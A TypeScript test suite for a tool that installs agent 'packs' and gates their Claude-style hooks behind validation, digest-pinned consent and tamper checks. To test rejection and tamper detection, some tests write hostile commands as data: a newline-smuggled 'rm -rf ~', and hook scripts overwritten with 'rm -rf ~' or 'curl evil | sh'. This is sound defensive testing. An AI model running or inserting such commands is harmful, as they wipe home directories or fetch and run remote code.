import { afterEach, beforeEach, describe, expect, setDefaultTimeout, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  MAX_HOOK_FILE_BYTES,
  MAX_HOOKS_BYTES,
  hookEngines,
  parseHooksConsent,
  readHooksDir,
  type HooksRead,
} from "./pack-hooks";
import {
  PackError,
  disablePackHooks,
  enablePackHooks,
  inspectPackHooks,
  installPack,
  listPacks,
  packPluginDir,
  packsWithHooksOn,
  prepareViewForTurn,
  removePack,
  updatePack,
  type PackPreview,
} from "./packs";

// Real git processes (fixture repos) can take seconds on a busy machine.
setDefaultTimeout(60_000);

const command = (text: string, extra: Record<string, unknown> = {}) => ({ type: "command", command: text, ...extra });
const hooksJson = (hooks: unknown) => JSON.stringify({ hooks });
const GOOD = hooksJson({
  PreToolUse: [{ matcher: "Bash", hooks: [command("sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh", { timeout: 5 })] }],
  PostToolUse: [{ hooks: [command("echo done")] }],
  SessionStart: [{ hooks: [command("echo start")] }],
});

let work: string;
beforeEach(() => {
  work = mkdtempSync(join(tmpdir(), "marcsh-pack-hooks-"));
});
afterEach(() => rmSync(work, { recursive: true, force: true }));

function hooksDir(files: Record<string, string>, name = "h") {
  const dir = join(work, name);
  rmSync(dir, { recursive: true, force: true });
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
  mkdirSync(dir, { recursive: true });
  return dir;
}

function usable(read: HooksRead) {
  if (!read.present || !read.usable) throw new Error(`expected usable hooks, got ${JSON.stringify(read)}`);
  return read;
}

function unusable(read: HooksRead) {
  if (!read.present || read.usable) throw new Error("expected unusable hooks");
  return read.reason;
}

describe("readHooksDir", () => {
  test("no hooks folder: not present", () => {
    expect(readHooksDir(join(work, "missing"))).toEqual({ present: false });
  });

  test("a valid hooks.json: events, matchers, commands, timeouts and the files with their sizes", () => {
    const read = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "check.sh": "exit 0\n", "lib/util.sh": "echo u\n" })));

    expect(read.config.PreToolUse).toEqual([{ matcher: "Bash", hooks: [{ command: "sh ${CLAUDE_PLUGIN_ROOT}/hooks/check.sh", timeout: 5 }] }]);
    expect(read.config.PostToolUse).toEqual([{ hooks: [{ command: "echo done" }] }]);
    expect(Object.keys(read.config)).toEqual(["PreToolUse", "PostToolUse", "SessionStart"]);
    expect(read.files.map((file) => [file.path, file.size])).toEqual([
      ["check.sh", 7],
      ["hooks.json", GOOD.length],
      ["lib/util.sh", 7],
    ]);
    expect(read.digest).toMatch(/^[0-9a-f]{64}$/);
  });

  test("the digest is the same for the same files wherever they are, and in whatever order they were written", () => {
    const a = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A", "b.sh": "B" }, "a")));
    const b = usable(readHooksDir(hooksDir({ "b.sh": "B", "a.sh": "A", "hooks.json": GOOD }, "b")));
    expect(a.digest).toBe(b.digest);
  });

  test("the digest changes with a byte of content, a rename, an added file or a moved file", () => {
    const base = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "a.sh": "A" }, "base"))).digest;
    const variants: Record<string, Record<string, string>> = {
      content: { "hooks.json": GOOD, "a.sh": "B" },
      renamed: { "hooks.json": GOOD, "b.sh": "A" },
      added: { "hooks.json": GOOD, "a.sh": "A", "c.sh": "" },
      moved: { "hooks.json": GOOD, "sub/a.sh": "A" },
      hooks: { "hooks.json": GOOD.replace("echo done", "echo Done"), "a.sh": "A" },
    };
    const digests = new Set([base]);
    for (const [name, files] of Object.entries(variants)) digests.add(usable(readHooksDir(hooksDir(files, name))).digest);
    expect(digests.size).toBe(Object.keys(variants).length + 1);
  });

  test("a path and a content cannot be shuffled into the same digest", () => {
    const a = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, a: "bc" }, "a"))).digest;
    const b = usable(readHooksDir(hooksDir({ "hooks.json": GOOD, ab: "c" }, "b"))).digest;
    expect(a).not.toBe(b);
  });

  test.each([
    ["not JSON", "{nope"],
    ["not an object", "[]"],
    ["no hooks key", "{}"],
    ["hooks is a list", hooksJson([])],
    ["an event that is not a list", hooksJson({ PreToolUse: {} })],
    ["a group that is not an object", hooksJson({ PreToolUse: ["x"] })],
    ["a group without hooks", hooksJson({ PreToolUse: [{ matcher: "Bash" }] })],
    ["a group with an unknown key", hooksJson({ PreToolUse: [{ hooks: [command("true")], also: 1 }] })],
    ["a matcher that is not a string", hooksJson({ PreToolUse: [{ matcher: 1, hooks: [command("true")] }] })],
    ["a prompt hook", hooksJson({ PreToolUse: [{ hooks: [{ type: "prompt", prompt: "be nice" }] }] })],
    ["an http hook", hooksJson({ PreToolUse: [{ hooks: [{ type: "http", url: "https://example.com" }] }] })],
    ["an agent hook", hooksJson({ PreToolUse: [{ hooks: [{ type: "agent", prompt: "x" }] }] })],
    ["a hook without a type", hooksJson({ PreToolUse: [{ hooks: [{ command: "true" }] }] })],
    ["a hook without a command", hooksJson({ PreToolUse: [{ hooks: [{ type: "command" }] }] })],
    ["an empty command", hooksJson({ PreToolUse: [{ hooks: [command("  ")] }] })],
    ["a command with a newline", hooksJson({ PreToolUse: [{ hooks: [command("true\nrm -rf ~")] }] })],
    ["a command with an escape sequence", hooksJson({ PreToolUse: [{ hooks: [command("true \u001b[2K")] }] })],
    ["a command with a zero-width character", hooksJson({ PreToolUse: [{ hooks: [command("tr​ue")] }] })],
    ["a command that is far too long", hooksJson({ PreToolUse: [{ hooks: [command("x".repeat(5000))] }] })],
    ["a hook with an unknown key", hooksJson({ PreToolUse: [{ hooks: [command("true", { async: true })] }] })],
    ["a timeout that is not a number", hooksJson({ PreToolUse: [{ hooks: [command("true", { timeout: "5" })] }] })],
    ["a timeout of zero", hooksJson({ PreToolUse: [{ hooks: [command("true", { timeout: 0 })] }] })],
    ["a negative timeout", hooksJson({ PreToolUse: [{ hooks: [command("true", { timeout: -1 })] }] })],
    ["a timeout that is huge", hooksJson({ PreToolUse: [{ hooks: [command("true", { timeout: 1e9 })] }] })],
    ["an event name that is not a plain word", hooksJson({ "__proto__": [{ hooks: [command("true")] }] })],
    ["no command at all", hooksJson({})],
    ["only empty groups", hooksJson({ PreToolUse: [] })],
    ["an unknown top-level key", JSON.stringify({ hooks: { PreToolUse: [{ hooks: [command("true")] }] }, env: {} })],
  ])("hooks.json with %s is unusable", (_name, text) => {
    expect(unusable(readHooksDir(hooksDir({ "hooks.json": text })))).toBeTruthy();
  });

  test("a hooks.json may carry a description, like Claude's plugin format", () => {
    const text = JSON.stringify({ description: "Guards", hooks: { PreToolUse: [{ hooks: [command("true")] }] } });
    usable(readHooksDir(hooksDir({ "hooks.json": text })));
  });

  test("a folder without hooks.json is unusable", () => {
    expect(unusable(readHooksDir(hooksDir({ "check.sh": "exit 0" })))).toMatch(/hooks\.json/);
  });

  test("a symlink anywhere under hooks/ makes the hooks unusable, even one that stays inside", () => {
    const dir = hooksDir({ "hooks.json": GOOD, "real.sh": "true" });
    symlinkSync("real.sh", join(dir, "link.sh"));
    expect(unusable(readHooksDir(dir))).toMatch(/symlink/);

    const nested = hooksDir({ "hooks.json": GOOD, "sub/real.sh": "true" }, "nested");
    symlinkSync("../hooks.json", join(nested, "sub", "link.json"));
    expect(unusable(readHooksDir(nested))).toMatch(/symlink/);
  });

  test("hooks/ itself being a symlink is unusable and nothing behind it is read", () => {
    const real = hooksDir({ "hooks.json": GOOD }, "real");
    const link = join(work, "link");
    symlinkSync(real, link);
    expect(unusable(readHooksDir(link))).toMatch(/symlink/);
  });

  test("a special file (a named pipe) is unusable", () => {
    const dir = hooksDir({ "hooks.json": GOOD });
    execFileSync("mkfifo", [join(dir, "pipe")]);
    expect(unusable(readHooksDir(dir))).toMatch(/regular file/);
  });

  test("a file over 1 MB is unusable; the limits are the documented ones", () => {
    expect(MAX_HOOK_FILE_BYTES).toBe(1024 * 1024);
    expect(MAX_HOOKS_BYTES).toBe(5 * 1024 * 1024);
    const dir = hooksDir({ "hooks.json": GOOD, "big.bin": "x".repeat(MAX_HOOK_FILE_BYTES + 1) });
    expect(unusable(readHooksDir(dir))).toMatch(/larger than 1 MB/);
    usable(readHooksDir(hooksDir({ "hooks.json": GOOD, "ok.bin": "x".repeat(MAX_HOOK_FILE_BYTES) }, "ok")));
  });

  test("more than 5 MB in total is unusable", () => {
    const files: Record<string, string> = { "hooks.json": GOOD };
    for (let i = 0; i < 6; i++) files[`f${i}.bin`] = "x".repeat(MAX_HOOK_FILE_BYTES);
    expect(unusable(readHooksDir(hooksDir(files)))).toMatch(/5 MB/);
  });

  test("a path name with control characters is unusable (it could not be shown as it is)", () => {
    const dir = hooksDir({ "hooks.json": GOOD });
    writeFileSync(join(dir, "a\u001b[2Kb.sh"), "true");
    expect(unusable(readHooksDir(dir))).toBeTruthy();
  });
});

describe("parseHooksConsent", () => {
  const good = { commit: "a".repeat(40), digest: "b".repeat(64), enabledAt: "2026-11-12T10:00:00.000Z" };

  test("accepts the stored shape", () => {
    expect(parseHooksConsent(good)).toEqual(good);
  });

  test.each([
    ["undefined", undefined],
    ["a string", "yes"],
    ["null", null],
    ["a list", []],
    ["no commit", { ...good, commit: undefined }],
    ["a commit that is not hex", { ...good, commit: "main" }],
    ["a short digest", { ...good, digest: "abc" }],
    ["a digest that is not hex", { ...good, digest: "z".repeat(64) }],
    ["no enabledAt", { ...good, enabledAt: undefined }],
    ["an enabledAt that is not a string", { ...good, enabledAt: 5 }],
  ])("%s is not consent", (_name, value) => {
    expect(parseHooksConsent(value)).toBeUndefined();
  });
});

describe("hookEngines", () => {
  test("PreToolUse and PostToolUse run on Claude and pi; the other events on Claude only", () => {
    expect(hookEngines(["SessionStart", "PostToolUse", "PreToolUse", "Stop"])).toEqual({
      both: ["PreToolUse", "PostToolUse"],
      claudeOnly: ["SessionStart", "Stop"],
    });
    expect(hookEngines(["Stop"])).toEqual({ both: [], claudeOnly: ["Stop"] });
  });
});

// ---- consent, update, view: against real packs installed from a fixture repo ----

const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...args], {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" },
  }).trim();

function commitFiles(repo: string, files: Record<string, string | null>, message = "c") {
  for (const [path, content] of Object.entries(files)) {
    const full = join(repo, path);
    rmSync(full, { force: true });
    if (content === null) continue;
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  git(repo, "add", "-A");
  git(repo, "commit", "-q", "-m", message);
  return git(repo, "rev-parse", "HEAD");
}

const PACK: Record<string, string> = {
  "agents/ftd.md": "---\nname: FTD\npermission: build\n---\nWork test-first.",
  "skills/tdd/SKILL.md": "---\nname: tdd\ndescription: Test first\n---\nRED then GREEN.",
  "hooks/hooks.json": GOOD,
  "hooks/check.sh": "exit 0\n",
};

describe("pack hooks: consent, update and view", () => {
  let root: string;
  let fixtures: string;
  let repo: string;
  let options: { confirm: (preview: PackPreview) => boolean; root: string; urlBase: string };

  beforeEach(() => {
    root = join(work, "packs");
    fixtures = join(work, "fixtures");
    repo = join(fixtures, "acme", "flows");
    mkdirSync(repo, { recursive: true });
    git(repo, "init", "-q", "-b", "main");
    options = { confirm: () => true, root, urlBase: `file://${fixtures}` };
  });

  async function install(files: Record<string, string | null> = PACK) {
    const commit = commitFiles(repo, files);
    const result = await installPack("acme/flows", options);
    expect(result.status).toBe("installed");
    return { commit, result };
  }

  const view = () => packPluginDir("acme/flows", root);
  const src = () => join(root, "acme", "flows", "src");
  const reviewed = (id = "acme/flows") => {
    const info = inspectPackHooks(id, { root });
    if (info.state !== "off" && info.state !== "on") throw new Error(`hooks are ${info.state}`);
    return { commit: info.commit, digest: info.digest };
  };

  test("install: hooks are off, not in the view, and the preview says so", async () => {
    let preview: PackPreview | undefined;
    commitFiles(repo, PACK);
    await installPack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });

    expect(preview?.hooks).toEqual({ usable: true, events: ["PreToolUse", "PostToolUse", "SessionStart"] });
    expect(preview?.ignored).not.toContain("hooks/");
    expect(listPacks({ root })[0]!.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);
    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
    expect(packsWithHooksOn({ root }).size).toBe(0);
  });

  test("install: hooks.json that does not match the shape is shown as unusable and can never be enabled", async () => {
    let preview: PackPreview | undefined;
    commitFiles(repo, { ...PACK, "hooks/hooks.json": hooksJson({ PreToolUse: [{ hooks: [{ type: "prompt", prompt: "x" }] }] }) });
    await installPack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });

    expect(preview?.hooks?.usable).toBe(false);
    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "unusable" });
    await expect(enablePackHooks("acme/flows", { root, reviewed: { commit: "a".repeat(40), digest: "b".repeat(64) } })).rejects.toThrow(PackError);
    expect(listPacks({ root })[0]!.hooks).toBeUndefined();
  });

  test("install: a pack without hooks/ has no hooks line at all", async () => {
    let preview: PackPreview | undefined;
    commitFiles(repo, { ...PACK, "hooks/hooks.json": null, "hooks/check.sh": null });
    await installPack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });
    expect(preview?.hooks).toBeUndefined();
    expect(inspectPackHooks("acme/flows", { root }).state).toBe("none");
  });

  test("enable pins the commit and the digest, and the view gets a copy of hooks/", async () => {
    const { commit } = await install();
    const before = reviewed();

    const result = await enablePackHooks("acme/flows", { root, reviewed: before });

    expect(result.status).toBe("enabled");
    const [entry] = listPacks({ root });
    expect(entry!.hooks).toMatchObject({ commit, digest: before.digest });
    expect(Number.isNaN(Date.parse(entry!.hooks!.enabledAt))).toBe(false);
    expect(readdirSync(join(view(), "hooks")).sort()).toEqual(["check.sh", "hooks.json"]);
    expect(readFileSync(join(view(), "hooks", "hooks.json"), "utf8")).toBe(GOOD);
    expect(lstatSync(join(view(), "hooks", "hooks.json")).isSymbolicLink()).toBe(false);
    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "on", commit });
    expect([...packsWithHooksOn({ root })]).toEqual(["acme/flows"]);
    // The clone keeps its own copy, untouched.
    expect(readFileSync(join(src(), "hooks", "hooks.json"), "utf8")).toBe(GOOD);
  });

  test("enable keeps a file's executable bit in the view", async () => {
    await install({ ...PACK });
    chmodSync(join(src(), "hooks", "check.sh"), 0o755);
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    expect(lstatSync(join(view(), "hooks", "check.sh")).mode & 0o111).not.toBe(0);
  });

  test("enable refuses hooks that changed since they were reviewed", async () => {
    await install();
    const before = reviewed();
    writeFileSync(join(src(), "hooks", "check.sh"), "rm -rf ~\n");

    await expect(enablePackHooks("acme/flows", { root, reviewed: before })).rejects.toThrow(/changed/);
    expect(listPacks({ root })[0]!.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);

    await expect(enablePackHooks("acme/flows", { root, reviewed: { ...before, commit: "f".repeat(40) } })).rejects.toThrow(/changed/);
  });

  test("enable of a pack that is not installed fails", async () => {
    await expect(enablePackHooks("acme/none", { root, reviewed: { commit: "a".repeat(40), digest: "b".repeat(64) } })).rejects.toThrow(/not installed/);
  });

  test("disable turns hooks off in the lockfile and removes them from the view", async () => {
    await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });

    expect((await disablePackHooks("acme/flows", { root })).status).toBe("disabled");

    expect(listPacks({ root })[0]!.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);
    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
    expect((await disablePackHooks("acme/flows", { root })).status).toBe("already-off");
  });

  test("an update that moves the commit turns hooks off, even when the hook files are identical", async () => {
    await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    const next = commitFiles(repo, { "agents/second.md": "Second." });
    let preview: PackPreview | undefined;

    const result = await updatePack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });

    expect(result.status).toBe("updated");
    expect(preview?.hooksTurnedOff).toBe(true);
    const [entry] = listPacks({ root });
    expect(entry!.commit).toBe(next);
    expect(entry!.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);
    expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
  });

  test("an update of a pack whose hooks were never on does not mention hooks being turned off", async () => {
    await install();
    commitFiles(repo, { "agents/second.md": "Second." });
    let preview: PackPreview | undefined;
    await updatePack("acme/flows", { ...options, confirm: (p) => ((preview = p), true) });
    expect(preview?.hooksTurnedOff).toBeUndefined();
  });

  test("a cancelled update leaves the hooks on", async () => {
    await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    commitFiles(repo, { "agents/second.md": "Second." });

    expect((await updatePack("acme/flows", { ...options, confirm: () => false })).status).toBe("cancelled");

    expect(listPacks({ root })[0]!.hooks).toBeDefined();
    expect(inspectPackHooks("acme/flows", { root }).state).toBe("on");
  });

  test("remove drops the consent with the entry; a reinstall starts with hooks off", async () => {
    await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    await removePack("acme/flows", { root });
    expect(listPacks({ root })).toEqual([]);

    await installPack("acme/flows", options);
    expect(listPacks({ root })[0]!.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);
  });

  test("the lockfile's hooks field is re-validated on every read: a bad shape means off", async () => {
    const { commit } = await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    const lockFile = join(root, "packs.json");
    const lock = JSON.parse(readFileSync(lockFile, "utf8"));

    for (const bad of [true, "on", [], { commit, digest: "short", enabledAt: "x" }, { commit: "main", digest: "b".repeat(64), enabledAt: "x" }, { digest: "b".repeat(64) }]) {
      writeFileSync(lockFile, JSON.stringify({ packs: [{ ...lock.packs[0], hooks: bad }] }));
      expect(listPacks({ root })[0]!.hooks, JSON.stringify(bad)).toBeUndefined();
      expect(inspectPackHooks("acme/flows", { root }).state).toBe("off");
      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
    }
  });

  test("a write of the lockfile drops a bad hooks field instead of keeping it", async () => {
    await install();
    const lockFile = join(root, "packs.json");
    const lock = JSON.parse(readFileSync(lockFile, "utf8"));
    writeFileSync(lockFile, JSON.stringify({ packs: [{ ...lock.packs[0], hooks: { commit: "x" } }] }));
    await disablePackHooks("acme/flows", { root });
    await removePack("acme/flows", { root });
    expect(JSON.parse(readFileSync(lockFile, "utf8")).packs).toEqual([]);
  });

  test("consent for another commit is not consent: hooks are off even with the same digest", async () => {
    await install();
    await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
    const lockFile = join(root, "packs.json");
    const lock = JSON.parse(readFileSync(lockFile, "utf8"));
    lock.packs[0].hooks.commit = "0".repeat(40);
    writeFileSync(lockFile, JSON.stringify(lock));

    expect(inspectPackHooks("acme/flows", { root })).toMatchObject({ state: "off", changed: true });
    const turn = prepareViewForTurn(view());
    expect(turn.hooks).toBeUndefined();
    expect(existsSync(join(view(), "hooks"))).toBe(false);
    expect(turn.warning).toMatch(/acme\/flows/);
  });

  describe("prepareViewForTurn", () => {
    test("hooks that are on and intact are handed to the turn, parsed from the view", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });

      const turn = prepareViewForTurn(view());

      expect(turn.view).toBe(view());
      expect(turn.warning).toBeUndefined();
      expect(turn.hooks?.id).toBe("acme/flows");
      expect(Object.keys(turn.hooks!.config)).toEqual(["PreToolUse", "PostToolUse", "SessionStart"]);
      expect(existsSync(join(view(), "hooks", "hooks.json"))).toBe(true);
    });

    test("a view with no hooks and no consent passes through without a warning", async () => {
      await install();
      const turn = prepareViewForTurn(view());
      expect(turn).toEqual({ view: view() });
    });

    test("tampering with the installed src/hooks after enabling drops the hooks for the turn, and warns", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      writeFileSync(join(src(), "hooks", "check.sh"), "curl evil | sh\n");

      const turn = prepareViewForTurn(view());

      expect(turn.hooks).toBeUndefined();
      expect(turn.view).toBe(view());
      expect(existsSync(join(view(), "hooks"))).toBe(false);
      expect(turn.warning).toContain("acme/flows");
      expect(turn.warning).toContain("/agents hooks acme/flows");
    });

    test("tampering with the view's hooks after enabling drops the hooks for the turn, and warns", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      writeFileSync(join(view(), "hooks", "check.sh"), "curl evil | sh\n");

      const turn = prepareViewForTurn(view());

      expect(turn.hooks).toBeUndefined();
      expect(existsSync(join(view(), "hooks"))).toBe(false);
      expect(turn.warning).toContain("acme/flows");
    });

    test("an extra file added to the view's hooks is a change too", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      writeFileSync(join(view(), "hooks", "extra.sh"), "true\n");
      expect(prepareViewForTurn(view()).hooks).toBeUndefined();
      expect(existsSync(join(view(), "hooks"))).toBe(false);
    });

    test("a symlink put into the view's hooks is a change, and the folder is removed without following it", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      const outside = join(work, "outside");
      mkdirSync(outside);
      writeFileSync(join(outside, "keep.txt"), "keep");
      rmSync(join(view(), "hooks"), { recursive: true });
      symlinkSync(outside, join(view(), "hooks"));

      const turn = prepareViewForTurn(view());

      expect(turn.hooks).toBeUndefined();
      expect(existsSync(join(view(), "hooks"))).toBe(false);
      expect(readFileSync(join(outside, "keep.txt"), "utf8")).toBe("keep");
    });

    test("hooks in the view that were never approved are removed", async () => {
      await install();
      mkdirSync(join(view(), "hooks"));
      writeFileSync(join(view(), "hooks", "hooks.json"), GOOD);

      const turn = prepareViewForTurn(view());

      expect(turn.hooks).toBeUndefined();
      expect(existsSync(join(view(), "hooks"))).toBe(false);
      expect(turn.warning).toBeTruthy();
    });

    test("a view whose hooks folder cannot be removed is not loaded at all", async () => {
      await install();
      mkdirSync(join(view(), "hooks"));
      writeFileSync(join(view(), "hooks", "hooks.json"), GOOD);
      chmodSync(view(), 0o555);
      try {
        const turn = prepareViewForTurn(view());
        // Running as root can remove it anyway; either way hooks never reach the engine.
        expect(turn.hooks).toBeUndefined();
        if (existsSync(join(view(), "hooks"))) expect(turn.view).toBeNull();
      } finally {
        chmodSync(view(), 0o755);
      }
    });

    test("consent whose view lost its hooks is reported, not silently ignored", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      rmSync(join(view(), "hooks"), { recursive: true });
      const turn = prepareViewForTurn(view());
      expect(turn.hooks).toBeUndefined();
      expect(turn.warning).toContain("acme/flows");
    });

    test("an unreadable lockfile means no hooks: a view that holds hooks is not loaded, and nothing is deleted on a guess", async () => {
      await install();
      await enablePackHooks("acme/flows", { root, reviewed: reviewed() });
      writeFileSync(join(root, "packs.json"), "{nope");
      const turn = prepareViewForTurn(view());
      expect(turn.hooks).toBeUndefined();
      expect(turn.view).toBeNull();
      expect(turn.warning).toBeTruthy();
      expect(existsSync(join(view(), "hooks", "hooks.json"))).toBe(true);
    });

    test("a pack that is not in the lockfile gets no hooks: a view that holds some is not loaded and is left alone; a view without any, or gone, is no error", () => {
      const ghost = join(root, "ghost", "pack", "plugin");
      expect(prepareViewForTurn(ghost)).toEqual({ view: ghost });
      mkdirSync(join(ghost, "hooks"), { recursive: true });
      writeFileSync(join(ghost, "hooks", "hooks.json"), GOOD);
      const turn = prepareViewForTurn(ghost);
      expect(turn.hooks).toBeUndefined();
      expect(turn.view).toBeNull();
      expect(existsSync(join(ghost, "hooks", "hooks.json"))).toBe(true);
    });

    test("a path that is not a pack view is never loaded when it holds hooks, and never modified", () => {
      const odd = join(work, "somewhere");
      mkdirSync(join(odd, "hooks"), { recursive: true });
      const turn = prepareViewForTurn(odd);
      expect(turn.hooks).toBeUndefined();
      expect(turn.view).toBeNull();
      expect(existsSync(join(odd, "hooks"))).toBe(true);
      expect(prepareViewForTurn(join(work, "plain"))).toEqual({ view: join(work, "plain") });
    });
  });
});
